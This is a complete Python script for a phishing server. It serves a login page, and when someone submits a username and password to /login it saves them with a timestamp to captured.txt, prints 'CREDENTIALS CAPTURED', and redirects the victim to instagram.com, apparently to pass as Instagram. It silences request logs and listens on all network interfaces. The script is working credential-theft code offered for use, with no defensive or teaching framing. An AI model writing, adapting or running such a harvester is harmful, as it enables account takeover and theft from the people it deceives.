#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 8080

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            params = urllib.parse.parse_qs(data.decode())

            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open('captured.txt', 'a') as f:
                f.write(f"[{timestamp}] User: {username} | Pass: {password}\n")

            print(f"\n[+] CREDENTIALS CAPTURED: {username}:{password}")

            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com')
            self.end_headers()

    def log_message(self, format, *args):
        pass

def get_ip():
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    ip = s.getsockname()[0]
    s.close()
    return ip

if __name__ == '__main__':
    print(f"[*] Starting server on port {PORT}")
    print(f"[*] Local:    http://localhost:{PORT}")
    print(f"[*] Network:  http://{get_ip()}:{PORT}")
    print(f"[*] Waiting for credentials...\n")
    with socketserver.TCPServer(("0.0.0.0", PORT), PhishHandler) as httpd:
        httpd.serve_forever()
